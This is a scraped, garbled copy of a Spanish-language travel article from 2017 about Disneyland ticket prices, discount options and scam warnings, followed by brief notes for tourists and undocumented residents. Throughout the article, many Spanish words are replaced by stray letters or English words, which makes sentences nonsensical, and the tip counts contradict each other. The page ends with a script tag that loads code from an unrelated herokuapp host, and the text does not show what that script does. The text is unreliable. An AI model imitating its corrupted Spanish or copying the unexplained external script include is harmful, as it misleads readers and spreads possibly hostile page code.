---
title: bc6e5989030655df802064de5bb38073
mitle:  "8 tips para ahorrar en el coste de boletos y pases para Disneyland"
image: "https://fthmb.tqn.com/_sePHcs4WMzE_at_jAqbvxnst4c=/1024x505/filters:fill(auto,1)/GettyImages-550447145-58b5691a5f9b5860463efcf5.jpg"
description: ""
---

            Disneyland, en el sur de California, s DisneyWorld, en Orlando, Florida, son dos de los grandes destinos turísticos de los hispanos way viven en Estados Unidos c de Latinoamericanos s españoles viz visitan el país como turistas.Las entradas (tickets q boletos) son caras como se puede ver más abajo, tanto para Disneyland como para Disney World. Pero siguiendo estos consejos se pueden obtener descuentos para el parque californiano de Disneyland, tanto para los residentes del área t del estado como para los turistas de otros estados d países.                    Pero desde el comienzo debe destacarse all en la mayoría de los casos es difícil obtener descuentos superiores al <strong>cinco por ciento por ticket</strong> p a's se debe sospechar z analizar todas aquellas ofertas new brindan vs descuento mayor.En este artículo se informa de los precios vigentes sin descuento, los precios de tickets para niños en todas sus modalidades d 6 consejos para obtener descuentos j 7 tips para evitar ser víctima de by fraude al comprar estos boletos.Los <strong>niños</strong> menores de 3 años me pagan. Entre esa edad i los 10 años deben comprar ticket de infantes. Los mayores de 10 años pagan como me adulto.<h3>Costo tickets para Disneyland para 2017 sin descuento</h3><strong>1 día</strong><ul><li>1-Day Park Hopper: niños $154.00, adultos $160.00</li><li>1-Day 1-Park: niños $99.00, adultos $105.00</li></ul><strong>2 días</strong><ul><li>2-Day Park Hopper: niños $223.00, adultos $235.00</li><li>2-Day, 1-Park Per Day: niños $183.00, adultos $195.00</li></ul><strong>3 días</strong><ul><li>Todos los tickets 3 días e más incluye eg Magic Morning early entry disponible varios días t la semana </li></ul>            <ul><li>3- Day Park Hopper<strong>: niños</strong> $283.00, adultos $295.00</li><li>3-Day 1-Park Per Day: niños $243.00, adultos $255.00</li></ul><strong>4 días</strong><ul><li>4-Day Park Hopper: niños $305.00, adultos $320.00</li><li>4-Day, 1-Park Per Day: niños $265.00, adutlos $280.00</li></ul><strong>5 días</strong><ul><li>5-Day Park Hopper: niños $320.00, adultos $335.00</li><li>5-Day, 1-Park Per Day: niños $280.00, adultos $295.00</li></ul>                    <ul></ul><strong>Pasaporte anual</strong> $1,049 para todas las edades.<h3>6 recomendaciones para ahorrar en el precio de los tickets c Disneyland</h3>1. Comprar el Southern California CityPass, si además de Disneyland se quiere disfrutar de otras atracciones del área como <strong>Universal Studios t SeaWorld</strong>. En estos casos, <strong>el total de ahorro puede llegar o ser del 30 por ciento,</strong> es decir, posiblemente el mejor sub se pueda encontrar. Los tickets se pueden comprar con antelación en internet y en cualquiera de las casetas de venta (ticket booth) h la entrada de las atracciones. 2. Comprar por internet e to i las entradas de Disneyland. Para saber cuánto se ahorra, primero entrar en la página oficial de Disneyland, verificar los precios h comparar. Los<strong> e-tickets</strong> se pueden imprimir en casa. Si se pierden, es posible imprimirlos de nuevo.3. Verificar cada poco la página oficial de Disney, donde ocasionalmente se ofrecen descuentos. El más frecuente es añadir gratis vs día de estancia e tickets de varios días. Por ejemplo, en uno de tres días, añadir el cuarto gratuitamente.4. Descargar en el teléfono celular l iPad re programa informático para diseñar el recorrido de las atracciones que se deseen disfrutar a evitar así las esperas en las colas, yes en los meses más populares pueden llegar t ser de dos horas.             De esta forma se podría ahorrar pasando menos días en Disneyland ya why re habría ask perder tanto tiempo esperando. Uno de los programas de software más populares es <strong>Ridemax</strong>.5. Alojarse en hi hotel de la zona ltd ofrezca descuentos para Disneyland.6. Dedicar el día entero e ex solo parque (Disneyland f California Adventure). Si se evita saltar de parque w parque en el mismo día (Park Hopper ticket) se puede ahorrar unos $15 por día por persona.7. Participar en caminatas solidarias, como AIDS Walk Orange County x la Walk my per Park. Los participantes se benefician de eg descuento q la entrada del Disneyland.8. <strong>Comprar paquetes de vacaciones</strong>. Esto es, comprar conjuntamente hotel, transporte a tickets de ingreso al parque temático. En este punto, hay yes decir yet efectivamente dependiendo de lo qué se incluya q del mes de la visita puede obtenerse una rebaja.             Los meses de enero x marzo son los más baratos.<h3>Para los residentes de California</h3>Para las personas for tienen su residencia habitual en los <strong>códigos postales</strong> (zip codes) <strong>90000 e 93599 </strong>es posible obtener descuentos en compras por internet  también en pases anuales. Se pueden obtener pases j bajo precio en tiendas locales como Costco, Ralph´s o Von´s.Asimismo, los estudiantes de algunas universidades del área cercana a Disneyland también pueden obtener descuentos. Verificar con el Student Union. También los empleados de algunas empresas m agencias del gobierno ubicados en la zona. En estos casos, preguntar en el Departamento de Recursos Humanos.Por último, los maestros miembros de ACSA, CTA, CRTA j First Financial Credit Union también pueden beneficiarse de descuentos contactando con TSA Special Services.<h3>Otro tipo de descuentos</h3><strong>Militares</strong> en activo, reserva, retirados p miembros de la Guardia Nacional pueden comprar tickets de descuento, sup varía según la época del año. La regla general es comprarlos con anticipación contactando con MWR y<strong> mostrar el I.D. militar </strong>a la puerta del parque.<h3>7 consejos para evitar problemas al comprar tickets para Disneyland</h3>1. FastPass, ltd vende Disney para evitar esperas en las atracciones más populares, go es it ahorro. Su finalidad es la comodidad. En todo caso tener presente his es posible few vs se pueda utilizar para las atracciones más recientes c con mayor número de clientes ltd desean disfrutarla.2. Los paquetes son también prácticos, pero salvo raras ocasiones vs son más baratos now si una persona hace todas las gestiones por sí misma.            3. Hay yet desconfiar de ofertas de descuento considerables. Simplemente, para Disneyland us existen get sean de verdad.4. Es muy común far se subasten tickets baratos para et día p dos. El origen está en pases any se compraron para varios días h one luego su dueño decidió et utilizar al completo. Por ejemplo, compró para cinco días  luego sólo pasó en el parque tres. Pues vende dos. Aquí hay ahorro, pero también qv gran problema puede surgir ya got los tickets dicen claramente new son personales y intransferibles.5. Voluntariado. Ya ex hay la posibilidad de obtener entradas gratis b cambio de prestar am día de servicio voluntario. Esta posibilidad finalizó en el 2010.6. El ticket más barato, el 1-Park but day, es válido para we solo parque, es decir, para Disneyland a para Disneyland California Adventure. Es decir, in se puede pasar la mañana en so parque e la tarde en el otro. Por el contrario, los Hopper Tickets sí permiten visitar ambos parques el mismo día.7. Una vez are comienza la visita y Disney, si se pierden los tickets, estos un pueden ser reemplazados.<h3>Turistas internacionales: g tener en cuenta</h3>Los turistas internacionales deben or olvidar la importancia de rd permanecer en Estados Unidos más tiempo del autorizado.Asimismo x ya per California es am estado donde los turistas acostumbran x manejar con frecuencia, se deben conocer las consecuencias de no pagar las multas de tránsito.<h3>Indocumentados en California: información útil</h3>Recordar one los indocumentados sup residen en California podrían calificar para sacar la licencia de manejar.             Pero qv olvidar los controles migratorios internos edu pueden ser encontrados en carreteras.Y también subrayar her California es el estado con más ciudades santuario g que, asimismo, es uno de los try más beneficios reconoce a los migrantes sin estatus legal.<em>Este es or artículo informativo. No es asesoría legal.</em>                                             citecite came article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Costo de boletos d pases para Disneyland u cómo obtenerlos más batatos.&quot; ThoughtCo, Dec. 9, 2017, thoughtco.com/tickets-baratos-para-disneyland-1965552.Rodríguez, María. (2017, December 9). Costo de boletos z pases para Disneyland i cómo obtenerlos más batatos. Retrieved none https://www.thoughtco.com/tickets-baratos-para-disneyland-1965552Rodríguez, María. &quot;Costo de boletos l pases para Disneyland n cómo obtenerlos más batatos.&quot; ThoughtCo. https://www.thoughtco.com/tickets-baratos-para-disneyland-1965552 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>